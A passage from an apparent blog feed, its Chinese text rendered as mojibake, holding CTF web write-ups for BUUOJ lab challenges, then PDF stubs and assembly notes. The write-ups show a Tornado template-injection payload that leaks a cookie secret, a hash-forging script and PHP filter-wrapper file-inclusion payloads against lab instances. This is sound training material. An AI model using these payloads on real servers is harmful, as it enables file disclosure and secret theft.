id="æå®¢å¤§æŒ‘æˆ˜-2019-Havefun"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Havefun" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h2><p><a href="http://dc831063-5096-4421-8cad-7d59def721a5.node3.buuoj.cn" target="_blank" rel="noopener">http://dc831063-5096-4421-8cad-7d59def721a5.node3.buuoj.cn</a></p><p>æŸ¥çœ‹æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$cat=$_GET[&apos;cat&apos;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat==&apos;dog&apos;)&#123;</span><br><span class="line">echo &apos;Syc&#123;cat_cat_cat_cat&#125;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºä¼ å…¥å‚æ•°ä½¿å¾—cat=dog<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cat=dog</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./12.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{7d14e194-7772-4d41-8c61-fb1a0388b25e}</p><h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p><a href="http://6538e59c-7290-4314-876a-71896b2316fa.node3.buuoj.cn" target="_blank" rel="noopener">http://6538e59c-7290-4314-876a-71896b2316fa.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./13.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>æŒ¨ä¸ªè®¿é—®å¾—åˆ°ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/flag.txt&amp;filehash=4d81edafee08fa38738a59e9fd150d50</span><br><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line">/file?filename=/welcome.txt&amp;filehash=27f929d16f4606d46be11db34391a228</span><br><span class="line">/welcome.txt</span><br><span class="line">render</span><br><span class="line">/file?filename=/hints.txt&amp;filehash=bfc06735e011c9552a2fdb9f07e6dccc</span><br><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><p>æ ¹æ®è§„å¾‹éœ€è¦æ„é€ payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(fllllllllllllag))</span><br></pre></td></tr></table></figure></p><p>å…ˆçœ‹çœ‹render,æ˜¯ä¸ªè°ƒç”¨ res.render({options}) å»å‘æ¨¡æ¿ä¸­æ¸²æŸ“æ•°æ®, å¯ä»¥æŠŠè§†å›¾å“åº”ç»™å®¢æˆ·ç«¯çš„æ¸²æŸ“å‡½æ•°,å°è¯•æŠ“åŒ…è®¿é—®fllllllllllllagæ–‡ä»¶<br><figure class="image-box">                <img src="./14.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure></p><p>æ ¹æ®/error?msg=Erroræç¤ºå¯ä»¥ç”¨errorå˜é‡è¯»å–æ–‡ä»¶,æŸ¥ä¸€ä¸‹tornadoé‡Œcookie_secretçš„ä½ç½®</p><p><a href="https://www.tornadoweb.org/en/latest/guide/security.html" target="_blank" rel="noopener">https://www.tornadoweb.org/en/latest/guide/security.html</a>åœ¨handler/settingsæ–‡ä»¶é‡Œ</p><p>æ„é€ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./15.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>cookie_secret:0a2781d2-6438-4103-8978-926c5e109fc8</p><p>æ¥ä¸‹æ¥æ ¹æ®æç¤ºå†™ä¸ªè„šæœ¬åŠ å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line">cookie_secret = <span class="string">'0a2781d2-6438-4103-8978-926c5e109fc8'</span></span><br><span class="line">md5.update(filename.encode(<span class="string">"utf8"</span>))</span><br><span class="line">file_md5 = md5.hexdigest()</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(cookie_secret + file_md5)</span><br><span class="line">filehash = md5.hexdigest()</span><br><span class="line"><span class="keyword">print</span> filehash</span><br></pre></td></tr></table></figure><p>å¾—åˆ° 022b103d797804318dc8eb68133d1dcc<br><figure class="image-box">                <img src="./16.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure></p><p>flag{c14f33f9-d55a-4416-8215-e0468fe7f9c0}</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h2><p><a href="http://3c1b7c0b-3605-4ce5-b792-0b9ca36ddd7f.node3.buuoj.cn" target="_blank" rel="noopener">http://3c1b7c0b-3605-4ce5-b792-0b9ca36ddd7f.node3.buuoj.cn</a></p><p>æŸ¥çœ‹æºç ,æ‰¾åˆ°å¯ç–‘é¡µé¢</p><figure class="image-box">                <img src="./17.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>ç»§ç»­çœ‹æºç </p><figure class="image-box">                <img src="./18.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>ç„¶åç›´æ¥endäº†,æç¤ºå›å»çœ‹çœ‹</p><figure class="image-box">                <img src="./19.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>Archive_room.php â€“&gt; end.php</p><p>æŠ“ä¸ªåŒ…çœ‹çœ‹,å‘ç°è·³æ¿æ˜¯action.php</p><figure class="image-box">                <img src="./20.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>è®¿é—®secr3t.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">Â Â Â Â &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">Â Â Â Â &lt;metaÂ charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Â Â Â Â highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">Â Â Â Â error_reporting(<span class="number">0</span>);</span><br><span class="line">Â Â Â Â $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file,Â <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line"><span class="comment">//strstr() å‡½æ•°æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ˜¯ï¼Œè¿”å›è¯¥å­—ç¬¦ä¸²åŠå‰©ä½™éƒ¨åˆ†ï¼Œå¦åˆ™è¿”å› FALSE,è¿™ä¸ªå‡½æ•°åŒºåˆ†å¤§å°å†™,stristr()å‡½æ•°ä¸åŒºåˆ†å¤§å°å†™</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">"OhÂ no!"</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">exit</span>();</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â <span class="keyword">include</span>($file);Â </span><br><span class="line"><span class="comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä»£ç éœ€è¦ç”¨åˆ°base64è¯»å–æ–‡ä»¶æºç çš„ä¼ªåè®®,æ„é€ payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p><p>è§£base64å¾—æºç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">Â  Â  &lt;head&gt;</span><br><span class="line">Â  Â  Â  Â  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">Â  Â  Â  Â  &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">Â  Â  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">Â  Â  &lt;body style=<span class="string">"background-color:black;"</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">Â  Â  Â  Â Â </span><br><span class="line">Â  Â  Â  Â  &lt;h1 style=<span class="string">"font-family:verdana;color:red;text-align:center;"</span>&gt;å•Šå“ˆï¼ä½ æ‰¾åˆ°æˆ‘äº†ï¼å¯æ˜¯ä½ çœ‹ä¸åˆ°æˆ‘QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">Â  Â  Â  Â Â </span><br><span class="line">Â  Â  Â  Â  &lt;p style=<span class="string">"font-family:arial;color:red;font-size:20px;text-align:center;"</span>&gt;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="meta">&lt;?php</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  <span class="keyword">echo</span> <span class="string">"æˆ‘å°±åœ¨è¿™é‡Œ"</span>;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  $flag = <span class="string">'flag&#123;1c5044a3-10a5-4073-8bc3-a56134196d35&#125;'</span>;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  $secret = <span class="string">'jiAng_Luyuan_w4nts_a_g1rIfri3nd'</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="meta">?&gt;</span></span><br><span class="line">Â  Â  Â  Â  &lt;/p&gt;</span><br><span class="line">Â  Â  &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>flag{1c5044a3-10a5-4073-8bc3-a56134196d35}</p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h2><p><a href="http://2fe69fec-e36f-470f-8434-0e32a3761d6b.node3.buuoj.cn" target="_blank" rel="noopener">http://2fe69fec-e36f-470f-8434-0e32a3761d6b.node3.buuoj.cn</a></p><p>æ ¹æ®ç½‘å€ /?file=flag.php</p><p>æƒ³åˆ°æ–‡ä»¶åŒ…å«,å…ˆä¼ªåè®®è¯»ä¸€æ³¢æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>è§£base64å<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Can you find out the flag?"</span>;</span><br><span class="line"><span class="comment">//flag&#123;ba49b5dd-32ae-45f4-8fce-ea258e0807ca&#125;</span></span><br></pre></td></tr></table></figure></p><p>flag{ba49b5dd-32ae-45f4-8fce-ea258e0807ca}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;HCTF-2018-WarmUp&quot;&gt;&lt;a href=&quot;#HCTF-2018-WarmUp&quot; class=&quot;headerlink&quot; title=&quot;[HCTF 2018]WarmUp&quot;&gt;&lt;/a&gt;[HCTF 2018]WarmUp&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;htt
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="ä¸ªäººctfç«èµ›" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>GINKGOå¤§åºŸç‰©æ¯_wp</title>
    <link href="https://www.damyahome.github.io/GINKGO%E5%A4%A7%E5%BA%9F%E7%89%A9%E6%9D%AF-wp/"/>
    <id>https://www.damyahome.github.io/GINKGO%E5%A4%A7%E5%BA%9F%E7%89%A9%E6%9D%AF-wp/</id>
    <published>2020-09-23T13:06:12.000Z</published>
    <updated>2020-09-23T13:08:32.116Z</updated>
    
    <content type="html"><![CDATA[<p>pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ<br><div class="row">    <embed src="GINKGOå¤§åºŸç‰©æ¯_wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;GINKGOå¤§åºŸç‰©æ¯_wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;


      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="ä¸ªäººctfç«èµ›" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>GinkgoåºŸç‰©æ¯_web1é«˜åœ°_å¤ç°</title>
    <link href="https://www.damyahome.github.io/Ginkgo%E5%BA%9F%E7%89%A9%E6%9D%AF-web1%E9%AB%98%E5%9C%B0-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.damyahome.github.io/Ginkgo%E5%BA%9F%E7%89%A9%E6%9D%AF-web1%E9%AB%98%E5%9C%B0-%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-09-23T13:05:35.000Z</published>
    <updated>2020-09-23T13:07:38.989Z</updated>
    
    <content type="html"><![CDATA[<p>pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ<br><div class="row">    <embed src="GinkgoåºŸç‰©æ¯_web1é«˜åœ°_å¤ç°.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;GinkgoåºŸç‰©æ¯_web1é«˜åœ°_å¤ç°.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="ä¸ªäººctfç«èµ›" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2020GACTF_miscå¤ç°</title>
    <link href="https://www.damyahome.github.io/2020GACTF-misc%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.damyahome.github.io/2020GACTF-misc%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-09-23T13:01:40.000Z</published>
    <updated>2020-09-23T13:05:03.856Z</updated>
    
    <content type="html"><![CDATA[<p>pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ<br><div class="row">    <embed src="2020GACTF_miscå¤ç°.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;2020GACTF_miscå¤ç°.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div
      
    
    </summary>
    
    
      <category term="ctf writeup misc" scheme="https://www.damyahome.github.io/categories/ctf-writeup-misc/"/>
    
    
      <category term="ä¸ªäººctfç«èµ›" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>FCTF_wp</title>
    <link href="https://www.damyahome.github.io/FCTF-wp/"/>
    <id>https://www.damyahome.github.io/FCTF-wp/</id>
    <published>2020-09-23T11:51:04.000Z</published>
    <updated>2020-09-23T11:52:08.815Z</updated>
    
    <content type="html"><![CDATA[<p>pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ<br><div class="row">    <embed src="FCTF_wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;FCTF_wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;


&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="ä¸ªäººctfç«èµ›" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2020DozerCTF_wp_by_ginkgo_ä¸‰å¶è‰</title>
    <link href="https://www.damyahome.github.io/2020DozerCTF-wp-by-ginkgo-%E4%B8%89%E5%8F%B6%E8%8D%89/"/>
    <id>https://www.damyahome.github.io/2020DozerCTF-wp-by-ginkgo-%E4%B8%89%E5%8F%B6%E8%8D%89/</id>
    <published>2020-09-23T11:37:34.000Z</published>
    <updated>2020-09-23T11:39:58.357Z</updated>
    
    <content type="html"><![CDATA[<p>pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ<br><div class="row">    <embed src="2020_DozerCTF_wp_by_ginkgo_ä¸‰å¶è‰.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;2020_DozerCTF_wp_by_ginkgo_ä¸‰å¶è‰.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;applicatio
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="å›¢é˜Ÿctfç«èµ›" scheme="https://www.damyahome.github.io/tags/%E5%9B%A2%E9%98%9Fctf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>ç¬¬äº”å‘¨è¯¾å ‚ç¬”è®°(æ±‡ç¼–)</title>
    <link href="https://www.damyahome.github.io/%E7%AC%AC%E4%BA%94%E5%91%A8%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0-%E6%B1%87%E7%BC%96/"/>
    <id>https://www.damyahome.github.io/%E7%AC%AC%E4%BA%94%E5%91%A8%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0-%E6%B1%87%E7%BC%96/</id>
    <published>2020-04-04T10:37:30.000Z</published>
    <updated>2020-04-04T10:38:18.152Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h2><p>ä¸»è¦å¯„å­˜å™¨:(32ä½)<br>EAX EBX ECX EDX:æ•°æ®å¯„å­˜å™¨<br>ESI EDI:å˜å€å¯„å­˜å™¨<br>ESP:æŒ‡å‘æ ˆé¡¶<br>EBP:æŒ‡å‘æ ˆåº•<br>EIP:æŒ‡å‘æŒ‡ä»¤æ‰§è¡Œçš„ä¸‹ä¸€æ¡åœ°å€</p><p>R(64ä½)</p><p>ï¼ˆä»¥ä¸Šä¹Ÿæ˜¯åœ¨æ ˆä¸­çš„ä½ç½®é¡ºåºï¼‰</p><h2 id="å¸¸è§çš„æ±‡ç¼–æŒ‡ä»¤"><a href="#å¸¸è§çš„æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="å¸¸è§çš„æ±‡ç¼–æŒ‡ä»¤"></a>å¸¸è§çš„æ±‡ç¼–æŒ‡ä»¤</h2><p>mov eax,0x12  å°†0x12è¦†ç›–çš„å­˜å…¥eax<br>mov eax,ebx   å°†ebxdçš„å€¼è¦†ç›–çš„å­˜å…¥eax<br>add eaxï¼Œebx  å°†ebx+eaxå¹¶è¦†ç›–çš„å­˜å…¥eax<br>inc eax       eax++<br>edc eax       eaxâ€“</p><h2 id="PUSH"><a href="#PUSH" class="headerlink" title="PUSH"></a>PUSH</h2><p>pushæŒ‡ä»¤å°†æ“ä½œæ•°å‹å…¥å†…å­˜çš„æ ˆä¸­<br>ä¸ªäººç†è§£ï¼šæ ˆç»“æ„ä¸å˜ï¼Œpushæ•°æ®ï¼ˆå‹æ ˆï¼‰å‰ï¼Œå…ˆå°†espå€¼å‡4ï¼Œå†å°†æ“ä½œæ•°å†…å®¹å‹å…¥espæŒ‡ç¤ºçš„ä½ç½®ï¼Œå†è‡ªè¡Œ+4æ¢å¤åˆ°æ ˆé¡¶ä½ç½®<br>push eax    å°†eaxå†…å®¹å‹æ ˆ<br>push [var]  å°†varæŒ‡ç¤ºçš„4ç›´æ¥å†…å®¹å‹æ ˆ</p><h2 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h2><p>popæŒ‡ä»¤ä¸pushæŒ‡ä»¤ç›¸å,æ‰§è¡Œå‡ºæ ˆå·¥ä½œ<br>ä¸ªäººç†è§£ï¼šæ ˆç»“æ„ä¸å˜ï¼Œpopæ•°æ®ï¼ˆå‡ºæ ˆï¼‰å‰ï¼Œå…ˆå°†espæŒ‡ç¤ºåœ°å€ä¸­çš„å†…å®¹å‡ºæ ˆï¼Œç„¶åespå€¼+4æ¢å¤æ ˆé¡¶ä½ç½®<br>pop edi    å°†ediå†…å®¹å‡ºæ ˆ<br>pop [ebx]  å°†ebxæŒ‡ç¤ºçš„4ç›´æ¥å†…å®¹å‡ºæ ˆ</p><h2 id="CALL"><a href="#CALL" class="headerlink" title="CALL"></a>CALL</h2><p>callæŒ‡ä»¤å®ç°å­ç¨‹åºçš„è°ƒç”¨<br>ä¸ªäººç†è§£ï¼šcallæŒ‡ä»¤å…ˆå°†å½“å‰æ‰§è¡ŒæŒ‡ä»¤åœ°å€å…¥æ ˆï¼Œç„¶åæ— æ¡ä»¶è½¬ç§»åˆ°ç”±æ ‡ç­¾æŒ‡ç¤ºçš„æŒ‡ä»¤ï¼Œä½†ä¾æ—§ä¿å­˜è°ƒç”¨å‰çš„åœ°å€ä¿¡æ¯ï¼Œå½“è°ƒç”¨ç»“æŸåè¿”å›åˆ°è°ƒç”¨å‰çš„åœ°å€</p><h2 id="RET"><a href="#RET" class="headerlink" title="RET"></a>RET</h2><p>retæŒ‡ä»¤å®ç°å­ç¨‹åºçš„è¿”å›<br>ä¸ªäººç†è§£ï¼šretæŒ‡ä»¤å¼¹å‡ºæ ˆä¸­ä¿å­˜çš„æŒ‡ä»¤åœ°å€ï¼Œç„¶åæ— æ¡ä»¶è½¬ç§»åˆ°ä¿å­˜çš„æŒ‡ä»¤åœ°å€æ‰§è¡Œï¼Œç­‰å¾…ä¸‹ä¸€æ¬¡è¿”å›æ•°æ®</p><h2 id="è°ƒç”¨çº¦å®šç”»å›¾ç†è§£"><a href="#è°ƒç”¨çº¦å®šç”»å›¾ç†è§£" class="headerlink" title="è°ƒç”¨çº¦å®šç”»å›¾ç†è§£"></a>è°ƒç”¨çº¦å®šç”»å›¾ç†è§£</h2><figure class="image-box">                <img src="./pwn_pic.png" alt title class>                <p></p>            </figure><p>(ä»¥ä¸‹çº¯ä¸ªäººç†è§£,æœ‰ä¸å¯¹çš„åœ°æ–¹è™šå¿ƒå¬æ•™)</p><p>mainå‡½æ•°é‡Œå®šä¹‰Aå­ç¨‹åº,å¹¶èµ‹å€¼1,2,3,Aå­ç¨‹åºé‡Œè¿”å›a+b+cçš„å€¼<br>old ebpæ˜¯åŸæ ˆåº•,ä¸€ä¸ªä¿å­˜åŸæ ˆåº•åœ°å€çš„å¯„å­˜å™¨,å†…å®¹å¯å˜ç»“æ„ä¸å˜<br>ret addè¿”å›ç”±1,2,3èµ‹å€¼åçš„a+b+c,å½“æœ‰å€¼è¢«å®šä¹‰æ—¶å°±è¿”å›å€¼,åœ°å€ä½ç½®è‡ªè¡Œå˜åŒ–,åŠŸèƒ½ä¸å˜<br>mov ebp,esp,æœ‰æ–°å†…å®¹è¿›æ¥,ä¸€ä¸ªå…¥æ ˆè¿‡ç¨‹,å°†ebpçš„åœ°å€è½¬ç§»åˆ°esp<br>leave,ä¸€ä¸ªå‡ºæ ˆè¿‡ç¨‹,mov esp,ebp,å°†æ ˆé¡¶åœ°å€è½¬ç§»åˆ°æ ˆåº•,popå‡ºæ¥ä¸€ä¸ªebpåœ°å€çš„å†…å®¹,ä½†å› ä¸ºå·²ç»å°†espåœ°å€è½¬ç§»åˆ°ebp,æ‰€ä»¥pop ebpçš„å†…å®¹ä¾æ—§æ˜¯åœ¨å‡ºæ ˆ,retnè¿”å›å‡ºæ ˆçš„å€¼</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å¯„å­˜å™¨&quot;&gt;&lt;a href=&quot;#å¯„å­˜å™¨&quot; class=&quot;headerlink&quot; title=&quot;å¯„å­˜å™¨&quot;&gt;&lt;/a&gt;å¯„å­˜å™¨&lt;/h2&gt;&lt;p&gt;ä¸»è¦å¯„å­˜å™¨:(32ä½)&lt;br&gt;EAX EBX ECX EDX:æ•°æ®å¯„å­˜å™¨&lt;br&gt;ESI EDI:å˜å€å¯„å­˜å™¨&lt;br&gt;ESP:æŒ‡å‘æ ˆé¡¶&lt;
      
    
    </summary>
    
    
      <category term="ç¬”è®°" scheme="https://www.damyahome.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="æ±‡ç¼–" scheme="https://www.damyahome.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
